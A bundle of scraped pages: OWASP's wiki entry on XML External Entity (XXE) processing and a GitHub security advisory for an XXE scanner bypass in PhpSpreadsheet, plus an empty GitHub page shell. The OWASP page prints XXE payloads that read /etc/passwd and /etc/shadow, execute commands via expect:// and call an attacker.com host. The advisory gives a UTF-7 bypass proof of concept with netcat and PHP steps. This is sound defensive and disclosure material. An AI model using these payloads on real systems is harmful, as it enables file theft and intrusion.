=== Content from github.com_f8c596ed_20250114_220612.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FPHPOffice%2FPhpSpreadsheet%2Fblob%2F39fc51309181e82593b06e2fa8e45ef8333a0335%2Fsrc%2FPhpSpreadsheet%2FReader%2FSecurity%2FXmlScanner.php)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FPHPOffice%2FPhpSpreadsheet%2Fblob%2F39fc51309181e82593b06e2fa8e45ef8333a0335%2Fsrc%2FPhpSpreadsheet%2FReader%2FSecurity%2FXmlScanner.php)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=PHPOffice%2FPhpSpreadsheet)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[PHPOffice](/PHPOffice)
/
**[PhpSpreadsheet](/PHPOffice/PhpSpreadsheet)**
Public

* [Notifications](/login?return_to=%2FPHPOffice%2FPhpSpreadsheet) You must be signed in to change notification settings
* [Fork
  3.5k](/login?return_to=%2FPHPOffice%2FPhpSpreadsheet)
* [Star
   13.4k](/login?return_to=%2FPHPOffice%2FPhpSpreadsheet)

* [Code](/PHPOffice/PhpSpreadsheet)
* [Issues
  168](/PHPOffice/PhpSpreadsheet/issues)
* [Pull requests
  19](/PHPOffice/PhpSpreadsheet/pulls)
* [Discussions](/PHPOffice/PhpSpreadsheet/discussions)
* [Actions](/PHPOffice/PhpSpreadsheet/actions)
* [Security](/PHPOffice/PhpSpreadsheet/security)
* [Insights](/PHPOffice/PhpSpreadsheet/pulse)

Additional navigation options

* [Code](/PHPOffice/PhpSpreadsheet)
* [Issues](/PHPOffice/PhpSpreadsheet/issues)
* [Pull requests](/PHPOffice/PhpSpreadsheet/pulls)
* [Discussions](/PHPOffice/PhpSpreadsheet/discussions)
* [Actions](/PHPOffice/PhpSpreadsheet/actions)
* [Security](/PHPOffice/PhpSpreadsheet/security)
* [Insights](/PHPOffice/PhpSpreadsheet/pulse)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from owasp.org_9296df93_20250114_220614.html ===


For full functionality of this site it is necessary to enable JavaScript. Here are the  [instructions how to enable JavaScript in your web browser](http://turnonjs.com/).

[![OWASP logo](https://owasp.org/assets/images/logo.png)](https://owasp.org/)

[![](https://owasp.org/assets/images/logo.png)](https://owasp.org/)

 [Store](https://owasp.org/store)
[Donate](https://owasp.org/donate?reponame=www-community)
[Join](https://owasp.org/membership)

This website uses cookies to analyze our traffic and only share that information with our analytics partners.

Accept

x

[Store](https://owasp.org/store)
[Donate](https://owasp.org/donate?reponame=www-community)
[Join](https://owasp.org/membership)

# XML External Entity (XXE) Processing

Thank you for visiting OWASP.org. We have migrated our community to a new web platform and regretably the content for this page needed to be programmatically ported from its previous wiki page. There’s still some work to be done.

This is an example of a Project or Chapter Page.

## NVD Categorization

> [CWE-611: Improper Restriction of XML External Entity Reference](https://cwe.mitre.org/data/definitions/611.html): The software processes an XML document that can contain XML entities with URIs that resolve to documents outside of the intended sphere of control, causing the product to embed incorrect documents into its output.

## Description

An *XML External Entity* attack is a type of attack against an
application that parses XML input. This attack occurs when **XML input
containing a reference to an external entity is processed by a weakly
configured XML parser**. This attack may lead to the disclosure of
confidential data, denial of service, server side request forgery, port
scanning from the perspective of the machine where the parser is
located, and other system impacts.

The [XML 1.0 standard](http://www.w3.org/TR/REC-xml/) defines the
structure of an XML document. The standard defines a concept called an
entity, which is a storage unit of some type. There are a few different
types of entities, [external general/parameter parsed
entity](http://www.w3.org/TR/REC-xml/#sec-external-ent) often shortened
to **external entity**, that can access local or remote content via a
declared system identifier. The system identifier is assumed to be a URI
that can be dereferenced (accessed) by the XML processor when processing
the entity. The XML processor then replaces occurrences of the named
external entity with the contents dereferenced by the system identifier.
If the system identifier contains tainted data and the XML processor
dereferences this tainted data, the XML processor may disclose
confidential information normally not accessible by the application.
Similar attack vectors apply the usage of external DTDs, external
stylesheets, external schemas, etc. which, when included, allow similar
external resource inclusion style attacks.

Attacks can include disclosing local files, which may contain sensitive
data such as passwords or private user data, using file: schemes or
relative paths in the system identifier. Since the attack occurs
relative to the application processing the XML document, an attacker may
use this trusted application to pivot to other internal systems,
possibly disclosing other internal content via http(s) requests or
launching a [CSRF](CSRF "wikilink") attack to any unprotected internal
services. In some situations, an XML processor library that is
vulnerable to client-side memory corruption issues may be exploited by
dereferencing a malicious URI, possibly allowing arbitrary code
execution under the application account. Other attacks can access local
resources that may not stop returning data, possibly impacting
application availability if too many threads or processes are not
released.

Note that the application does not need to explicitly return the
response to the attacker for it to be vulnerable to information
disclosures. An attacker can leverage DNS information to exfiltrate data
through subdomain names to a DNS server that they controls.

## Risk Factors

* The application parses XML documents.
* Tainted data is allowed within the system identifier portion of the
  entity, within the [document type declaration](http://www.w3.org/TR/REC-xml/#sec-prolog-dtd) (DTD).
* The XML processor is configured to validate and process the DTD.
* The XML processor is configured to resolve external entities within
  the DTD.

## Examples

The examples below are from [Testing for XML Injection (OWASP-DV-008)](Testing_for_XML_Injection_%5C%28OWASP-DV-008%5C%29 "wikilink").

### Accessing a local resource that may not return

```
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM  "file:///dev/random" >]>
<foo>&xxe;</foo>

```
## Remote Code Execution

If fortune is on our side, and the PHP “expect” module is loaded, we can
get RCE. Let’s modify the payload

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo
  [<!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
  <user>`&xxe;`</user>
  <pass>`mypass`</pass>
</creds>

```
### Disclosing /etc/passwd or other targeted files

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>

```

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/shadow" >]>
<foo>&xxe;</foo>

```

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]>
<foo>&xxe;</foo>

```

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "http://www.attacker.com/text.txt" >]>
<foo>&xxe;</foo>

```
## Related [Attacks](https://owasp.org/www-community/attacks/)

* [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
* [Blind SQL Injection](Blind_SQL_Injection "wikilink")

## Related [Vulnerabilities](https://owasp.org/www-community/vulnerabilities/)

* [Missing XML Validation](Missing_XML_Validation "wikilink")

## Related [Controls](https://owasp.org/www-community/controls/)

Since the whole XML document is communicated from an untrusted client,
it’s not usually possible to selectively
[validate](Input_Validation "wikilink") or escape tainted data within
the system identifier in the DTD. Therefore, the XML processor should be
configured to use a local static DTD and disallow any declared DTD
included in the XML document.

Detailed guidance on how to disable XXE processing, or otherwise defend
against XXE attacks is presented in the [XML External Entity (XXE) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html).

## References

* OWASP [XML External Entity (XXE) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
* [Timothy Morgan’s 2014 Paper: XML Schema, DTD, and Entity Attacks - A Compendium of Known Techniques](http://www.vsecurity.com/download/papers/XMLDTDEntityAttacks.pdf)
* [Precursor presentation of above paper - at OWASP AppSec USA 2013](http://2013.appsecusa.org/2013/wp-content/uploads/2013/12/WhatYouDidntKnowAboutXXEAttacks.pdf)
* [CWE-611: Information Exposure Through XML External Entity Reference](http://cwe.mitre.org/data/definitions/611.html)
* [CWE-827: Improper Control of Document Type Definition](http://cwe.mitre.org/data/definitions/827.html)
* [Sascha Herzog’s Presentation on XML External Entity Attacks - at OWASP AppSec Germany 2010](https://www.owasp.org/images/5/5d/XML_Exteral_Entity_Attack.pdf)
* [PostgreSQL XXE vulnerability](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-3489)
* [SharePoint and DotNetNuke XXE Vulnerabilities, in French](http://www.agarri.fr/kom/archives/2011/09/15/failles_de_type_xee_dans_sharepoint_et_dotnetnuke/index.html)
* [XML Denial of Service Attacks and Defenses (in .NET)](http://msdn.microsoft.com/en-us/magazine/ee335713.aspx)
* [Early (2002) BugTraq Article on XXE](http://www.securityfocus.com/archive/1/297714/2002-10-27/2002-11-02/0)

Category:API\_Abuse

---

[Watch](https://github.com/owasp/www-community/subscription)
[Star](https://github.com/owasp/www-community)

**The OWASP® Foundation** works to improve the security of software through its community-led open source software projects,
hundreds of chapters worldwide, tens of thousands of members, and by hosting local and global conferences.
### Important Community Links

* [Community](/www-community/)
* [Attacks](/www-community/attacks)
* Vulnerabilities (You are here)
* [Controls](/www-community/controls)

### Upcoming OWASP Global Events

## Corporate Supporters

[Become a corporate supporter](https://owasp.org/supporters)

* [HOME](https://owasp.org/)
* [PROJECTS](https://owasp.org/projects/)
* [CHAPTERS](https://owasp.org/chapters/)
* [EVENTS](https://owasp.org/events/)
* [ABOUT](https://owasp.org/about/)
* [PRIVACY](https://owasp.org/www-policy/operational/privacy)
* [SITEMAP](https://owasp.org/sitemap/)
* [CONTACT](https://owasp.org/contact/)

OWASP, the OWASP logo, and Global AppSec are registered trademarks and AppSec Days, AppSec California, AppSec Cali, SnowFROC, and LASCON are trademarks of the OWASP Foundation, Inc. Unless otherwise specified, all content on the site is Creative Commons Attribution-ShareAlike v4.0 and provided without warranty of service or accuracy. For more information, please refer to our [General Disclaimer](/www-policy/operational/general-disclaimer.html). OWASP does not endorse or recommend commercial products or services, allowing our community to remain vendor neutral with the collective wisdom of the best minds in software security worldwide. Copyright 2025, OWASP Foundation, Inc.



=== Content from github.com_9b29dbe1_20250114_220614.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FPHPOffice%2FPhpSpreadsheet%2Fsecurity%2Fadvisories%2FGHSA-7cc9-j4mv-vcjp)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FPHPOffice%2FPhpSpreadsheet%2Fsecurity%2Fadvisories%2FGHSA-7cc9-j4mv-vcjp)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=PHPOffice%2FPhpSpreadsheet)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[PHPOffice](/PHPOffice)
/
**[PhpSpreadsheet](/PHPOffice/PhpSpreadsheet)**
Public

* [Notifications](/login?return_to=%2FPHPOffice%2FPhpSpreadsheet) You must be signed in to change notification settings
* [Fork
  3.5k](/login?return_to=%2FPHPOffice%2FPhpSpreadsheet)
* [Star
   13.4k](/login?return_to=%2FPHPOffice%2FPhpSpreadsheet)

* [Code](/PHPOffice/PhpSpreadsheet)
* [Issues
  168](/PHPOffice/PhpSpreadsheet/issues)
* [Pull requests
  19](/PHPOffice/PhpSpreadsheet/pulls)
* [Discussions](/PHPOffice/PhpSpreadsheet/discussions)
* [Actions](/PHPOffice/PhpSpreadsheet/actions)
* [Security](/PHPOffice/PhpSpreadsheet/security)
* [Insights](/PHPOffice/PhpSpreadsheet/pulse)

Additional navigation options

* [Code](/PHPOffice/PhpSpreadsheet)
* [Issues](/PHPOffice/PhpSpreadsheet/issues)
* [Pull requests](/PHPOffice/PhpSpreadsheet/pulls)
* [Discussions](/PHPOffice/PhpSpreadsheet/discussions)
* [Actions](/PHPOffice/PhpSpreadsheet/actions)
* [Security](/PHPOffice/PhpSpreadsheet/security)
* [Insights](/PHPOffice/PhpSpreadsheet/pulse)

# XXE in PHPSpreadsheet's XLSX reader

High

[oleibman](/oleibman)
published
GHSA-7cc9-j4mv-vcjp
Nov 16, 2024

## Package

composer

phpoffice/phpspreadsheet
([Composer](/advisories?query=ecosystem%3Acomposer))

## Affected versions

< 1.29.4
>= 2.0.0, < 2.1.3
>= 2.2.0, < 2.3.2
>= 3.3.0, < 3.4.0

## Patched versions

1.29.4
2.1.3
2.3.2
3.4.0

## Description

### Summary

The [XmlScanner class](https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php) has a [scan](https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php#L72) method which should prevent XXE attacks.

However, we found another bypass than the previously reported `CVE-2024-47873`, the regexes from the [findCharSet](https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php#L51) method, which is used for determining the current encoding can be bypassed by using a payload in the encoding UTF-7, and adding at end of the file a comment with the value `encoding="UTF-8"` with `"`, which is matched by the first regex, so that `encoding='UTF-7'` with single quotes `'` in the XML header is not matched by the second regex:

```
 $patterns = [
            '/encoding\\s*=\\s*"([^"]*]?)"/',
            "/encoding\\s*=\\s*'([^']*?)'/",
        ];

```

A payload for the `workbook.xml` file can for example be created with [CyberChef](https://gchq.github.io/CyberChef/#recipe=Encode_text('UTF-7%20(65000)')&input=Pz4KPCFET0NUWVBFIGZvbyBbCiAgPCFFTEVNRU5UIGZvbyBBTlkgPgogIDwhRU5USVRZIHh4ZSBTWVNURU0gImZpbGU6Ly8vZXRjL3Bhc3N3ZCIgPl0%2BCjxmb28%2BJnh4ZTs8L2Zvbz4K).

If you open an Excel file containing the payload from the link above stored in the `workbook.xml` file with PhpSpreadsheet, you will receive an HTTP request on `127.0.0.1:12345`. You can test that an HTTP request is created by running the `nc -nlvp 12345` command before opening the file containing the payload with PhpSpreadsheet.

To create the payload you need:

1. Create a file containing `<?xml version = "1.0" encoding='UTF-7'` in an XML file
2. Use the link attached above to create your XXE payload and add it to the XML file.
3. Add `+ADw-+ACE---encoding="UTF-8"--+AD4-` to the end of the XML file, which is matched by the first regex.

### PoC

[payload.xlsx](https://github.com/user-attachments/files/17375792/payload.xlsx)

* Create a new folder.
* Run the `composer require phpoffice/phpspreadsheet` command in the new folder.
* Create an `index.php` file in that folder with the following content:

```
<?php
require 'vendor/autoload.php';

use PhpOffice\PhpSpreadsheet\Spreadsheet;
use PhpOffice\PhpSpreadsheet\Writer\Xlsx;

$spreadsheet = new Spreadsheet();

$inputFileType = 'Xlsx';
$inputFileName = './payload.xlsx';

/**  Create a new Reader of the type defined in $inputFileType  **/
$reader = \PhpOffice\PhpSpreadsheet\IOFactory::createReader($inputFileType);
/**  Advise the Reader that we only want to load cell data  **/
$reader->setReadDataOnly(true);

$worksheetData = $reader->listWorksheetInfo($inputFileName);

foreach ($worksheetData as $worksheet) {

$sheetName = $worksheet['worksheetName'];

echo "<h4>$sheetName</h4>";
/**  Load $inputFileName to a Spreadsheet Object  **/
$reader->setLoadSheetsOnly($sheetName);
$spreadsheet = $reader->load($inputFileName);

$worksheet = $spreadsheet->getActiveSheet();
print_r($worksheet->toArray());

}
```

* Run the following command: `php -S 127.0.0.1:8080`
* Add the [payload.xlsx](https://github.com/user-attachments/files/17375792/payload.xlsx) file in the folder and open <https://127.0.0.1:8080> in a browser. You will see an HTTP request on netcat <http://127.0.0.1:12345/ext.dtd>.

### Impact

An attacker can bypass the sanitizer and achieve an [XXE attack](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_%28XXE%29_Processing).

### Severity

High

7.5

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Network

Attack complexity
Low

Privileges required
None

User interaction
None

Scope
Unchanged

Confidentiality
High

Integrity
None

Availability
None

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

### CVE ID

CVE-2024-48917

### Weaknesses

[CWE-611](/advisories?query=cwe%3A611)

### Credits

* [![@antoniospataro](https://avatars.githubusercontent.com/u/44066875?s=40&v=4)](/antoniospataro)
  [antoniospataro](/antoniospataro)
  Reporter
* [![@Antonio-R1](https://avatars.githubusercontent.com/u/54741970?s=40&v=4)](/Antonio-R1)
  [Antonio-R1](/Antonio-R1)
  Reporter

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


